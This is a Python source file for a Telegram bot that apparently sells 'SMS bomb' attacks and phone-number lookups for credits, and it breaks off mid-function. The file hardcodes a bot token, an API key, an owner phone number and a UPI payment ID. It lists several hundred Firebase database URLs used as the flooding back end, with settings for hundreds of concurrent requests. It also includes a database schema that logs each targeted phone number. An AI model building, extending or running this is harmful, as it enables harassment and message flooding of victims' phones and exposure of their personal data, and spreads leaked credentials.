#!/usr/bin/env python3
# 🔥 MERGED BOT V2 — Separate Credits + Separate Redeem + Daily Limits 🔥

import re, os, requests, json, sqlite3, random, string, time, asyncio, threading, sys, secrets
from datetime import datetime, timedelta, timezone
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import Optional

import httpx
from telegram import (
    Update, InlineKeyboardButton, InlineKeyboardMarkup,
    KeyboardButton, ReplyKeyboardMarkup, Bot, ChatMember
)
from telegram.constants import ParseMode, ChatAction
from telegram.ext import (
    Application, CommandHandler, CallbackQueryHandler,
    ContextTypes, MessageHandler, filters
)
from telegram.request import HTTPXRequest
from telegram.error import Conflict

# ══════════════════════════════════════════════════════════════
#                    ⚙️ CONFIGURATION
# ══════════════════════════════════════════════════════════════
TOKEN = '8873879212:AAG7IgjIkTrH5ZwHNGqs8bpIkPEagLPairc'
OWNER_ID = 8958230890
OWNER_USERNAME = "@Doremonxxxxx"

FORCE_CHANNEL_USERNAME = "trustedbuyer132"
FORCE_CHANNEL_LINK = "https://t.me/trustedbuyer132"

OWNER_CONTACT_USERNAME = "@Doremonxxxxx"
OWNER_CONTACT_LINK = "https://t.me/trustedbuyer132"
OWNER_PHONE = "9202469151"

UPI_ID = "vipin952000@oksbi"
UPI_NAME = "vipin"

TITAN_API = "https://numinfotitan.vercel.app/search"
TITAN_KEY = "TITANKENG"

VIDEO_URLS = [
    "https://files.catbox.moe/iex2o2.mp4",
    "https://files.catbox.moe/n444eb.mp4",
    "https://files.catbox.moe/xf4tqz.mp4",
]

# ══════════════════════════════════════════════════════════════
#                    🔘 BUTTONS
# ══════════════════════════════════════════════════════════════
BTN_SMS       = "💣 SMS BOMB"
BTN_SEARCH    = "🔍 NUMBER INFO"
BTN_CREDITS   = "💰 Mʏ Cʀᴇᴅɪᴛs"
BTN_REFERRAL  = "🔗 Rᴇғᴇʀʀᴀʟ"
BTN_RECHARGE  = "💳 Rᴇᴄʜᴀʀɢᴇ"
BTN_HISTORY   = "📜 Hɪsᴛᴏʀʏ"
BTN_STATUS    = "🛡️ Sᴛᴀᴛᴜs"
BTN_DEV       = "👨‍💻 Dᴇᴠᴇʟᴏᴘᴇʀ"
BTN_REDEEM    = "🔑 Rᴇᴅᴇᴇᴍ"
BTN_ADMIN     = "⚙️ Aᴅᴍɪɴ Pᴀɴᴇʟ"
BTN_BUY       = "💳 Bᴜʏ Cʀᴇᴅɪᴛs"

DAILY_FREE_BOMB = 2
DAILY_FREE_OSINT = 2

# ══════════════════════════════════════════════════════════════
#                    🔥 FIREBASE URLS (SMS Bomb)
# ══════════════════════════════════════════════════════════════
FIREBASE_URLS = [
    # ═══════ 🆕 DARK WORLD BATCH (TOP PE) ═══════
    "https://rettiugh-default-rtdb.firebaseio.com",
    "https://rgggggggggg-e2547-default-rtdb.firebaseio.com",
    "https://rich-people-19e06-default-rtdb.firebaseio.com",
    "https://risho-d4c66-default-rtdb.firebaseio.com",
    "https://fir-6b48f-default-rtdb.firebaseio.com",
    "https://colana-84ce2-default-rtdb.firebaseio.com",
    "https://raaz-5287d-default-rtdb.firebaseio.com",
    "https://new-sexy-default-rtdb.firebaseio.com",
    "https://amirrr-8a463-default-rtdb.firebaseio.com",
    "https://muajob-29c86-default-rtdb.firebaseio.com",
    "https://rahulgandhi-d09ca-default-rtdb.firebaseio.com",
    "https://hdjdjdj-a73f2-default-rtdb.firebaseio.com",
    "https://niggasionic-default-rtdb.asia-southeast1.firebasedatabase.app",
    "https://damo-98ebb-default-rtdb.firebaseio.com",
    "https://sep12-aea6d-default-rtdb.firebaseio.com",
    "https://hdfc-561e8-default-rtdb.firebaseio.com",
    "https://astra-b23a1-default-rtdb.firebaseio.com",
    "https://novap7-725ff-default-rtdb.firebaseio.com",
    "https://axisjames-default-rtdb.firebaseio.com",
    "https://yellow-panel-rto-default-rtdb.firebaseio.com",
    "https://bmw1-bdc10-default-rtdb.firebaseio.com",
    "https://me03-4e321-default-rtdb.firebaseio.com",
    "https://ream-13acd-default-rtdb.firebaseio.com",
    "https://makenewfriends-default-rtdb.firebaseio.com",
    "https://yt01-75a36-default-rtdb.firebaseio.com",
    "https://yqhwy-2fb47-default-rtdb.firebaseio.com",
    "https://hackerr-19f0c-default-rtdb.firebaseio.com",
    "https://rahais-default-rtdb.firebaseio.com",
    "https://tinmm88-b7db5-default-rtdb.firebaseio.com",
    "https://e9turnament1-default-rtdb.firebaseio.com",
    "https://apkpure-6eb6a-default-rtdb.firebaseio.com",
    "https://e14turnament2-default-rtdb.firebaseio.com",
    "https://bossuun-default-rtdb.firebaseio.com",
    "https://jsjsjdj-7f0d1-default-rtdb.firebaseio.com",
    "https://rahul-54fe9-default-rtdb.firebaseio.com",
    "https://runjun-master-panel-default-rtdb.firebaseio.com",
    "https://gsjjshdbs-default-rtdb.firebaseio.com",
    "https://fir-1fa16-default-rtdb.firebaseio.com",
    "https://newspreding-default-rtdb.firebaseio.com",
    "https://privatesok-59944-default-rtdb.firebaseio.com",
    "https://fir-27c9e-default-rtdb.firebaseio.com",
    "https://singhaana-6f199-default-rtdb.firebaseio.com",
    "https://dogla-de225-default-rtdb.firebaseio.com",
    "https://vibe-d238e-default-rtdb.firebaseio.com",
    "https://painislv-default-rtdb.firebaseio.com",
    "https://jsjdj7374j-default-rtdb.firebaseio.com",
    "https://jaduopop-a9a12-default-rtdb.firebaseio.com",
    "https://anjali-4a4bc-default-rtdb.firebaseio.com",
    "https://devil-king-101d4-default-rtdb.firebaseio.com",
    "https://shuruwat-admin-default-rtdb.firebaseio.com",
    "https://rajputlodu-5bed0-default-rtdb.firebaseio.com",
    "https://kitter-34345-default-rtdb.firebaseio.com",
    "https://abcd-6757-ad421-default-rtdb.firebaseio.com",
    "https://kali-90e1e-default-rtdb.firebaseio.com",
    "https://asif-alam991-default-rtdb.firebaseio.com",
    "https://anvith-jaan-default-rtdb.firebaseio.com",
    "https://chutkabaal-d7051-default-rtdb.firebaseio.com",
    "https://clone-79a6f-default-rtdb.firebaseio.com",
    "https://hospital-14-default-rtdb.firebaseio.com",
    "https://gooodhua-default-rtdb.firebaseio.com",
    "https://khushi-7fb1f-default-rtdb.firebaseio.com",
    "https://ppaanaal-default-rtdb.firebaseio.com",
    "https://priyanshrandi-18600-default-rtdb.firebaseio.com",
    "https://pehle-panel-default-rtdb.firebaseio.com",
    "https://yogeshbhai-default-rtdb.firebaseio.com",
    "https://singhaana-default-rtdb.firebaseio.com",
    "https://myapp-8228a-default-rtdb.firebaseio.com",
    "https://app-2-7ac78-default-rtdb.firebaseio.com",
    "https://sorry-2d3c5-default-rtdb.firebaseio.com",
    "https://fvbtl-3f47c-default-rtdb.firebaseio.com",
    "https://anther-a3fe9-default-rtdb.firebaseio.com",
    "https://avraj-4d02e-default-rtdb.firebaseio.com",
    "https://spy-25-default-rtdb.firebaseio.com",
    "https://sirelech1-default-rtdb.firebaseio.com",
    "https://rahulcscperosnl-default-rtdb.firebaseio.com",
    "https://reliable-stroopwa-default-rtdb.firebaseio.com",
    "https://rancho-72506-default-rtdb.firebaseio.com",
    "https://pablo-5a0d2-default-rtdb.firebaseio.com",

    # ═══════ 🆕 PERSONAL BATCH ═══════
    "https://reen-f8f5f-default-rtdb.firebaseio.com",
    "https://pehla-panel-green-default-rtdb.firebaseio.com",
    "https://lodaroll-default-rtdb.firebaseio.com",
    "https://jamini-c946b-default-rtdb.firebaseio.com",
    "https://strange-2e4aa-default-rtdb.firebaseio.com",
    "https://vdgsh-623ed-default-rtdb.firebaseio.com",
    "https://uday-d4bda-default-rtdb.firebaseio.com",

    # ═══════ 📦 PURANE URLs ═══════
    "https://vasu-panel-default-rtdb.firebaseio.com",
    "https://retameta-default-rtdb.firebaseio.com",
    "https://krishna4343-e45fd-default-rtdb.firebaseio.com",
    "https://kdbhai-25325-default-rtdb.firebaseio.com",
    "https://land-le-mera-default-rtdb.firebaseio.com",
    "https://kichudjdudh-default-rtdb.firebaseio.com",
    "https://mithun-da-default-rtdb.firebaseio.com",
    "https://ajay-5cac9-default-rtdb.firebaseio.com",
    "https://back-b40b7-default-rtdb.asia-southeast1.firebasedatabase.app",
    "https://pmnew230-default-rtdb.firebaseio.com",
    "https://rahul-panel-default-rtdb.firebaseio.com",
    "https://birend-b39e9-default-rtdb.firebaseio.com",
    "https://baba15-default-rtdb.asia-southeast1.firebasedatabase.app",
    "https://mamu-4db6e-default-rtdb.firebaseio.com",
    "https://bihar-master-panel-fb7cd-default-rtdb.firebaseio.com",
    "https://bhai-138a8-default-rtdb.firebaseio.com",
    "https://raj-bhai-1c1ad-default-rtdb.firebaseio.com",
    "https://ranimukarji-1182a-default-rtdb.firebaseio.com",
    "https://biharibhaiya-c718b-default-rtdb.firebaseio.com",
    "https://shukla2-default-rtdb.firebaseio.com",
    "https://ranjit-58640-default-rtdb.firebaseio.com",
    "https://newpanel-4412c-default-rtdb.firebaseio.com",
    "https://bittu3pannel-default-rtdb.firebaseio.com",
    "https://lalan-c7e44-default-rtdb.firebaseio.com",
    "https://uffuuf-d1a3c-default-rtdb.firebaseio.com",
    "https://fir-new-3-b572a-default-rtdb.firebaseio.com",
    "https://lol40-5bab7-default-rtdb.firebaseio.com",
    "https://rajaji-8d135-default-rtdb.firebaseio.com",
    "https://panelwalababa-ddd53-default-rtdb.firebaseio.com",
    "https://vikash-da-default-rtdb.firebaseio.com",
    "https://rea72-1566e-default-rtdb.firebaseio.com",
    "https://hospital-new-11-default-rtdb.firebaseio.com",
    "https://nowammyxdd-default-rtdb.firebaseio.com",
    "https://jujuboorchodi-default-rtdb.firebaseio.com",
    "https://seuihd-default-rtdb.firebaseio.com",
    "https://suman0h55-default-rtdb.firebaseio.com",
    "https://whithex-741e0-default-rtdb.firebaseio.com",
    "https://bsjshd-7e1bf-default-rtdb.asia-southeast1.firebasedatabase.app",
    "https://expert-5e1a0-default-rtdb.firebaseio.com",
    "https://jakepau-default-rtdb.firebaseio.com",
    "https://raj-londa-49db5-default-rtdb.firebaseio.com",
    "https://pm280reolc-default-rtdb.firebaseio.com",
    "https://botsieeee-af07c-default-rtdb.firebaseio.com",
    "https://topx-e09c6-default-rtdb.firebaseio.com",
    "https://lallo-6d4c5-default-rtdb.firebaseio.com",
    "https://second-wife-2-default-rtdb.firebaseio.com",
    "https://nand-d09e7-default-rtdb.firebaseio.com",
    "https://krishna5454-94fc5-default-rtdb.firebaseio.com",
    "https://asda-271a6-default-rtdb.firebaseio.com",
    "https://trigonnnnnnnn-default-rtdb.firebaseio.com",
    "https://xxxdrafft-default-rtdb.asia-southeast1.firebasedatabase.app",
    "https://arun-4024e-default-rtdb.firebaseio.com",
    "https://landlele-20855-default-rtdb.firebaseio.com",
    "https://arjun-singh-43d2f-default-rtdb.firebaseio.com",
    "https://dark-ka-app-default-rtdb.firebaseio.com",
    "https://nidhi-rani-default-rtdb.firebaseio.com",
    "https://nitu-23980-default-rtdb.firebaseio.com",
    "https://krijhjuiiiccyy-default-rtdb.firebaseio.com",
    "https://rahul-g11-default-rtdb.firebaseio.com",
    "https://rto-56-6cccf-default-rtdb.firebaseio.com",
    "https://download-b7393-default-rtdb.firebaseio.com",
    "https://rohet10-8919f-default-rtdb.firebaseio.com",
    "https://lol11-7da1c-default-rtdb.firebaseio.com",
    "https://ankitpanel-59086-default-rtdb.firebaseio.com",
    "https://rason00-default-rtdb.firebaseio.com",
    "https://ne-2db23-default-rtdb.asia-southeast1.firebasedatabase.app",
    "https://itslooksexp-default-rtdb.firebaseio.com",
    "https://raj-madarchodo-default-rtdb.firebaseio.com",
    "https://admin-sonu-8a567-default-rtdb.firebaseio.com",
    "https://randipelega-default-rtdb.firebaseio.com",
    "https://e21turnament2-default-rtdb.firebaseio.com",
    "https://ambani-19a25-default-rtdb.firebaseio.com",
    "https://sonuganduu-9d4da-default-rtdb.firebaseio.com",
    "https://gadhalalund-default-rtdb.firebaseio.com",
    "https://ahmedpanel-76b9c-default-rtdb.firebaseio.com",
    "https://khanipanel-d58cf-default-rtdb.firebaseio.com",
    "https://jyotiya75-default-rtdb.firebaseio.com",
    "https://saanvi-ji95-default-rtdb.firebaseio.com",
    "https://rto8-7f24f-default-rtdb.firebaseio.com",
    "https://penal-a93a8-default-rtdb.firebaseio.com",
    "https://ubhanhazx-default-rtdb.firebaseio.com",
    "https://pikachu-customer-16-default-rtdb.firebaseio.com",
    "https://e8383jsndn-default-rtdb.firebaseio.com",
    "https://saimharshji-default-rtdb.asia-southeast1.firebasedatabase.app",
    "https://mypnl01-ush-default-rtdb.firebaseio.com",
    "https://proof-abf73-default-rtdb.firebaseio.com",
    "https://apna3-e04f8-default-rtdb.firebaseio.com",
    "https://bola-2a0d3-default-rtdb.firebaseio.com",
    "https://lol24-95c49-default-rtdb.firebaseio.com",
    "https://fatmaadminpanel-default-rtdb.firebaseio.com",
    "https://rahulsharma-13303-default-rtdb.firebaseio.com",
    "https://myypppp-default-rtdb.asia-southeast1.firebasedatabase.app",
    "https://shsh-fb9c8-default-rtdb.firebaseio.com",
    "https://raj-panel-3e09a-default-rtdb.firebaseio.com",
    "https://khanpanel-c31a2-default-rtdb.firebaseio.com",
    "https://pornllllll-default-rtdb.firebaseio.com",
    "https://riyy-e012e-default-rtdb.firebaseio.com",
    "https://rajanmadarchod-fa98d-default-rtdb.firebaseio.com",
    "https://workohplic-default-rtdb.firebaseio.com",
    "https://panel-no-21-default-rtdb.firebaseio.com",
    "https://comkingdir-default-rtdb.firebaseio.com",
    "https://badka-3181b-default-rtdb.firebaseio.com",
    "https://kalui-a8e2b-default-rtdb.firebaseio.com",
    "https://vickyadmin45-default-rtdb.firebaseio.com",
    "https://iqrapanel-2f21d-default-rtdb.firebaseio.com",
    "https://rahul-8b7eb-default-rtdb.firebaseio.com",
    "https://bali-7acc3-default-rtdb.firebaseio.com",
    "https://firstlove2-1f2d9-default-rtdb.firebaseio.com",
    "https://sourav-f057d-default-rtdb.firebaseio.com",
    "https://pappuraj-714bd-default-rtdb.firebaseio.com",
    "https://astha-rani80-default-rtdb.firebaseio.com",
    "https://rohitbona-d8308-default-rtdb.firebaseio.com",
    "https://adityakaapp-default-rtdb.firebaseio.com",
    "https://hghg-6f0a8-default-rtdb.asia-southeast1.firebasedatabase.app",
    "https://tabuna-4e962-default-rtdb.firebaseio.com",
    "https://biki-3ae6e-default-rtdb.firebaseio.com",
    "https://adamm-green-default-rtdb.firebaseio.com",
    "https://gdgdgdgd-c1a32-default-rtdb.firebaseio.com",
    "https://nitish232626-default-rtdb.firebaseio.com",
    "https://amaat-a7916-default-rtdb.firebaseio.com",
    "https://project-1-16da0-default-rtdb.firebaseio.com",
    "https://aditya-9f66b-default-rtdb.firebaseio.com",
    "https://aya-tandi-default-rtdb.firebaseio.com",
    "https://ahmedpanel-e3d2d-default-rtdb.firebaseio.com",
    "https://mera-lala-default-rtdb.firebaseio.com",
    "https://iqrapanel-37c8d-default-rtdb.firebaseio.com",
    "https://baba-tillu-2-default-rtdb.firebaseio.com",
    "https://tuuui-60b15-default-rtdb.firebaseio.com",
    "https://fir-d327e-default-rtdb.firebaseio.com",
    "https://iiilsoee-default-rtdb.firebaseio.com",
    "https://vikasda-a78d5-default-rtdb.firebaseio.com",
    "https://polti-1317f-default-rtdb.firebaseio.com",
    "https://rahulbhi-default-rtdb.firebaseio.com",
    "https://arrun01-b1ece-default-rtdb.firebaseio.com",
    "https://rto-sandeep3-default-rtdb.firebaseio.com",
    "https://xrafaf-bfe94-default-rtdb.firebaseio.com",
    "https://vijay-afb12-default-rtdb.firebaseio.com",
    "https://rontem-a082b-default-rtdb.firebaseio.com",
    "https://adultapk-c3c4f-default-rtdb.firebaseio.com",
    "https://harrwp-6be36-default-rtdb.firebaseio.com",
    "https://pmnew157-default-rtdb.firebaseio.com",
    "https://madam-ji-17e1c-default-rtdb.firebaseio.com",
    "https://ramu-c81a7-default-rtdb.firebaseio.com",
    "https://pm-kisan-22f92-default-rtdb.firebaseio.com",
    "https://mainapanel-cleint-default-rtdb.firebaseio.com",
    "https://allinone-cf029-default-rtdb.firebaseio.com",
    "https://ramjidost-default-rtdb.firebaseio.com",
    "https://demon-4-default-rtdb.firebaseio.com",
    "https://hkfs-38ed5-default-rtdb.firebaseio.com",
    "https://ashishraj2-7e2e2-default-rtdb.firebaseio.com",
    "https://ak-boss-3a292-default-rtdb.firebaseio.com",
    "https://yellowpanel-9f036-default-rtdb.firebaseio.com",
    "https://tanvi-ji77-default-rtdb.firebaseio.com",
    "https://raj-admin-nokia-default-rtdb.firebaseio.com",
    "https://maxjoker98-2b75f-default-rtdb.firebaseio.com",
    "https://sagarguddu-268cb-default-rtdb.firebaseio.com",
    "https://akdk-f23fa-default-rtdb.firebaseio.com",
    "https://tracegod-168d5-default-rtdb.firebaseio.com",
    "https://uday-gaw-default-rtdb.firebaseio.com",
    "https://abhirt-58f65-default-rtdb.firebaseio.com",
    "https://krish-gana-default-rtdb.firebaseio.com",
    "https://e10ttqaq-default-rtdb.firebaseio.com",
    "https://oooo-2f098-default-rtdb.firebaseio.com",
    "https://subhash-45fb2-default-rtdb.firebaseio.com",
    "https://commotazee-darkness-default-rtdb.firebaseio.com",
    "https://kanak-ji99-default-rtdb.firebaseio.com",
    "https://saiyaraaa-ee8c4-default-rtdb.firebaseio.com",
    "https://priyaknn-3e914-default-rtdb.firebaseio.com",
    "https://urmila-ji12-default-rtdb.firebaseio.com",
    "https://amulyaji8080-default-rtdb.firebaseio.com",
    "https://lucky-c0915-default-rtdb.firebaseio.com",
    "https://priya-cfdb7-default-rtdb.firebaseio.com",
    "https://alwayssukuna-4dbb7-default-rtdb.firebaseio.com",
    "https://jrahh-83b83-default-rtdb.firebaseio.com",
    "https://videocalls-f3434-default-rtdb.firebaseio.com",
    "https://mama-ji-09-default-rtdb.firebaseio.com",
    "https://dark-1b5d9-default-rtdb.firebaseio.com",
    "https://sakshi1-dfc80-default-rtdb.firebaseio.com",
    "https://gojohere-29ab1-default-rtdb.firebaseio.com",
    "https://zamzam-baba77-default-rtdb.firebaseio.com",
    "https://ankit-raj-chutiya-default-rtdb.firebaseio.com",
    "https://akdh-e4bf4-default-rtdb.firebaseio.com",
    "https://arda-2fc05-default-rtdb.firebaseio.com",
    "https://amit-6f40a-default-rtdb.firebaseio.com",
    "https://usa-n-landon-default-rtdb.firebaseio.com",
    "https://hjmi-5af19-default-rtdb.firebaseio.com",
    "https://chumma-70293-default-rtdb.firebaseio.com",
    "https://hdfc-chodo-default-rtdb.firebaseio.com",
    "https://ravindra-d7887-default-rtdb.firebaseio.com",
    "https://ak47-e3976-default-rtdb.firebaseio.com",
    "https://mkdg-6a8f6-default-rtdb.firebaseio.com",
    "https://arunku25-9479d-default-rtdb.firebaseio.com",
    "https://ajio-427d1-default-rtdb.firebaseio.com",
    "https://htbc51-default-rtdb.firebaseio.com",
    "https://rurukatiu-default-rtdb.firebaseio.com",
    "https://new-panel-1e4a9-default-rtdb.firebaseio.com",
    "https://vasu-3rd-panel-default-rtdb.firebaseio.com",
    "https://rrt1-c797a-default-rtdb.firebaseio.com",
    "https://akumar-12eb3-default-rtdb.firebaseio.com",
    "https://riya-f1832-default-rtdb.firebaseio.com",
    "https://ghostx-panel-default-rtdb.firebaseio.com",
    "https://rajendra-2934a-default-rtdb.firebaseio.com",
    "https://e-challan-54-default-rtdb.firebaseio.com",
    "https://vrajbhai-4aa6e-default-rtdb.firebaseio.com",
    "https://hacker-panel-dcc53-default-rtdb.firebaseio.com",
    "https://atifhehu-7ec17-default-rtdb.firebaseio.com",
    "https://private-522a9-default-rtdb.firebaseio.com",
    "https://bittu-panal-cleint-default-rtdb.firebaseio.com",
    "https://soni-bbb64-default-rtdb.firebaseio.com",
    "https://zxcvbnm-13fb3-default-rtdb.firebaseio.com",
    "https://rahu-96df7-default-rtdb.firebaseio.com",
    "https://courier40-30jan-default-rtdb.firebaseio.com",
    "https://fixhogya-5b6e3-default-rtdb.firebaseio.com",
    "https://bega-8457c-default-rtdb.firebaseio.com",
    "https://mr-dr-72761-default-rtdb.firebaseio.com",
    "https://sintuadmin-default-rtdb.firebaseio.com",
    "https://vijayda-default-rtdb.firebaseio.com",
    "https://rto-47-b39f4-default-rtdb.firebaseio.com",
    "https://maja-1c323-default-rtdb.firebaseio.com",
    "https://benga-7d896-default-rtdb.firebaseio.com",
    "https://bipin-57f82-default-rtdb.firebaseio.com",
    "https://sumankr5764-e0ba8-default-rtdb.firebaseio.com",
    "https://kattapa-7faf3-default-rtdb.firebaseio.com",
    "https://rahudf-default-rtdb.firebaseio.com",
    "https://udyydfuuhc-default-rtdb.firebaseio.com",
]

REQUEST_TIMEOUT = 1.5
MAX_DEVICES_PER_URL = 999999
MAX_CONCURRENT = 500
BATCH_SIZE = 5000
BULK_TIMEOUT = 30

# ══════════════════════════════════════════════════════════════
#                    🔥 CACHE
# ══════════════════════════════════════════════════════════════
_device_cache = {
    "data": {"total": 0, "urls": 0, "url_devices": {}, "all_devices": [], "last_updated": 0},
    "timestamp": 0
}
_CACHE_TTL = 300
_background_refresh_running = False
_cache_ready = threading.Event()

# ══════════════════════════════════════════════════════════════
#                    🗄️ DATABASE
# ══════════════════════════════════════════════════════════════
DB_PATH = "merged_bot_v2.db"
_db_conn = None

def get_db():
    global _db_conn
    if _db_conn is None:
        _db_conn = sqlite3.connect(DB_PATH, timeout=10, check_same_thread=False)
        _db_conn.row_factory = sqlite3.Row
    return _db_conn

def init_db():
    conn = get_db(); c = conn.cursor()
    # Users: separate bomb_credits & osint_credits + daily counters
    c.execute('''CREATE TABLE IF NOT EXISTS users (
        user_id INTEGER PRIMARY KEY,
        bomb_credits INTEGER DEFAULT 0,
        osint_credits INTEGER DEFAULT 0,
        referrer_id INTEGER,
        joined_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
        last_reset TEXT,
        bomb_used_today INTEGER DEFAULT 0,
        osint_used_today INTEGER DEFAULT 0
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS banned_users (
        user_id INTEGER PRIMARY KEY, banned_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP, banned_by INTEGER)''')
    c.execute('''CREATE TABLE IF NOT EXISTS payments (
        id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, amount INTEGER,
        credits_given INTEGER, credit_type TEXT DEFAULT 'bomb',
        transaction_id TEXT, screenshot_id TEXT,
        status TEXT DEFAULT 'pending', created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)''')
    c.execute('''CREATE TABLE IF NOT EXISTS user_history (
        id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, action TEXT,
        details TEXT, created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)''')
    c.execute('''CREATE TABLE IF NOT EXISTS force_join_verified (
        user_id INTEGER PRIMARY KEY, verified_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)''')
    c.execute('''CREATE TABLE IF NOT EXISTS bomb_attempts (
        id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, phone TEXT,
        attempts INTEGER DEFAULT 1, last_attempt TIMESTAMP DEFAULT CURRENT_TIMESTAMP)''')
    # Separate redeem keys
    c.execute('''CREATE TABLE IF NOT EXISTS redeem_keys (
        key TEXT PRIMARY KEY, credits INTEGER, key_type TEXT DEFAULT 'bomb',
        max_uses INTEGER DEFAULT 1, used_count INTEGER DEFAULT 0,
        expiry_days INTEGER, created_by INTEGER,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP, expiry_at TIMESTAMP)''')
    c.execute('''CREATE TABLE IF NOT EXISTS key_redemptions (
        id INTEGER PRIMARY KEY AUTOINCREMENT, key TEXT, user_id INTEGER,
        redeemed_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP, UNIQUE(key, user_id))''')
    c.execute('''CREATE TABLE IF NOT EXISTS maintenance (
        id INTEGER PRIMARY KEY CHECK (id = 1),
        enabled INTEGER DEFAULT 0,
        message TEXT DEFAULT '🛠️ Bot is under maintenance.')''')
    conn.commit()
    c.execute("INSERT OR IGNORE INTO maintenance(id, enabled) VALUES(1, 0)")
    conn.commit()

init_db()

# ══════════════════════════════════════════════════════════════
#                    🔧 HELPERS
# ══════════════════════════════════════════════════════════════
IST = timezone(timedelta(hours=5, minutes=30))
def is_owner(uid): return uid == OWNER_ID
def _today_ist(): return datetime.now(IST).strftime("%Y-%m-%d")

def is_maintenance_on():
    conn = get_db(); c = conn.cursor()
    c.execute("SELECT enabled FROM maintenance WHERE id=1")
    row = c.fetchone()
    return bool(row[0]) if row else False

def set_maintenance(enabled, message=None):
    conn = get_db(); c = conn.cursor()
    if message:
        c.execute("UPDATE maintenance SET enabled=?, message=? WHERE id=1",
                  (1 if enabled else 0, message))
    else:
        c.execute("UPDATE maintenance SET enabled=? WHERE id=1", (1 if enabled else 0,))
    conn.commit()

def get_maintenance_message():
    conn = get_db(); c = conn.cursor()
    c.execute("SELECT message FROM maintenance WHERE id=1")
    row = c.fetchone()
    return row[0] if row else "🛠️ Under maintenance."

# ══════════════════════════════════════════════════════════════
#                    👤 USER / CREDITS (SEPARATE)
# ══════════════════════════════════════════════════════════════
def ensure_user(uid, ref=None):
    conn = get_db(); c = conn.cursor()
    c.execute("SELECT user_id FROM users WHERE user_id=?", (uid,))
    row = c.fetchone()
    if row:
        # reset daily if needed
        c.execute("SELECT last_reset FROM users WHERE user_id=?", (uid,))
        lr = c.fetchone()
        if lr and lr[0] != _today_ist():
            c.execute("UPDATE users SET last_reset=?, bomb_used_today=0, osint_used_today=0 WHERE user_id=?",
                      (_today_ist(), uid))
            conn.commit()
        return
    c.execute("""INSERT INTO users(user_id, bomb_credits, osint_credits, referrer_id,
                last_reset, bomb_used_today, osint_used_today)
                VALUES(?, 0, 0, ?, ?, 0, 0)""",
              (uid, ref, _today_ist()))
    conn.commit()
    if ref and ref != uid:
        c.execute("UPDATE users SET bomb_credits=bomb_credits+1, osint_credits=osint_credits+1 WHERE user_id=?", (ref,))
        conn.commit()

def get_credits(uid, kind='bomb'):
    """kind: 'bomb' or 'osint'"""
    ensure_user(uid)
    conn = get_db(); c = conn.cursor()
    col = 'bomb_credits' if kind == 'bomb' else 'osint_credits'
    c.execute(f"SELECT {col} FROM users WHERE user_id=?", (uid,))
    row = c.fetchone()
    return row[0] if row else 0

def get_daily_used(uid, kind='bomb'):
    ensure_user(uid)
    conn = get_db(); c = conn.cursor()
    col = 'bomb_used_today' if kind == 'bomb' else 'osint_used_today'
    c.execute(f"SELECT {col} FROM users WHERE user_id=?", (uid,))
    row = c.fetchone()
    return row[0] if row else 0

def add_credits(uid, amt, kind='bomb'):
    ensure_user(uid)
    conn = get_db(); c = conn.cursor()
    col = 'bomb_credits' if kind == 'bomb' else 'osint_credits'
    c.execute(f"UPDATE users SET {col}={col}+? WHERE user_id=?", (amt, uid))
    conn.commit()

def remove_credits(uid, amt, kind='bomb'):
    ensure_user(uid)
    conn = get_db(); c = conn.cursor()
    col = 'bomb_credits' if kind == 'bomb' else 'osint_credits'
    c.execute(f"UPDATE users SET {col}={col}-? WHERE user_id=? AND {col}>=?", (amt, uid, amt))
    a = c.rowcount; conn.commit(); return a > 0

def consume_credit(uid, kind='bomb'):
    """
    Try to consume: free daily first, then paid credits.
    Returns (success: bool, source: 'free'/'paid'/None, remaining_free: int, remaining_paid: int)
    """
    ensure_user(uid)
    if is_owner(uid):
        return True, 'owner', -1, -1
    conn = get_db(); c = conn.cursor()
    used_col = 'bomb_used_today' if kind == 'bomb' else 'osint_used_today'
    cred_col = 'bomb_credits' if kind == 'bomb' else 'osint_credits'
    daily_limit = DAILY_FREE_BOMB if kind == 'bomb' else DAILY_FREE_OSINT

    c.execute(f"SELECT {used_col}, {cred_col} FROM users WHERE user_id=?", (uid,))
    row = c.fetchone()
    used, paid = row[0], row[1]

    # Free daily first
    if used < daily_limit:
        c.execute(f"UPDATE users SET {used_col}={used_col}+1 WHERE user_id=?", (uid,))
        conn.commit()
        return True, 'free', daily_limit - (used + 1), paid

    # Then paid credits
    if paid > 0:
        c.execute(f"UPDATE users SET {cred_col}={cred_col}-1 WHERE user_id=?", (uid,))
        conn.commit()
        return True, 'paid', 0, paid - 1

    # Nothing left
    return False, None, 0, 0

def get_all_users():
    conn = get_db(); c = conn.cursor()
    c.execute("SELECT user_id, bomb_credits, osint_credits, joined_at FROM users ORDER BY joined_at DESC")
    return c.fetchall()

def get_banned_count():
    conn = get_db(); c = conn.cursor()
    c.execute("SELECT COUNT(*) FROM banned_users")
    return c.fetchone()[0]

def ban_user(uid, by):
    try:
        conn = get_db(); c = conn.cursor()
        c.execute("INSERT OR IGNORE INTO banned_users(user_id,banned_by) VALUES(?,?)", (uid, by))
        conn.commit(); return True
    except: return False

def unban_user(uid):
    try:
        conn = get_db(); c = conn.cursor()
        c.execute("DELETE FROM banned_users WHERE user_id=?", (uid,))
        a = c.rowcount; conn.commit(); return a > 0
    except: return False

def is_user_banned(uid):
    try:
        conn = get_db(); c = conn.cursor()
        c.execute("SELECT user_id FROM banned_users WHERE user_id=?", (uid,))
        return c.fetchone() is not None
    except: return False

def log_user_action(uid, action, details=""):
    conn = get_db(); c = conn.cursor()
    c.execute("INSERT INTO user_history(user_id,action,details) VALUES(?,?,?)", (uid, action, details))
    conn.commit()

def get_user_history(uid, limit=10):
    conn = get_db(); c = conn.cursor()
    c.execute("SELECT action,details,created_at FROM user_history WHERE user_id=? ORDER BY id DESC LIMIT ?", (uid, limit))
    return c.fetchall()

def log_bomb_attempt(user_id, phone):
    conn = get_db(); c = conn.cursor()
    c.execute("INSERT INTO bomb_attempts(user_id, phone) VALUES(?,?)", (user_id, phone))
    conn.commit()

def get_recent_bombs(limit=10):
    conn = get_db(); c = conn.cursor()
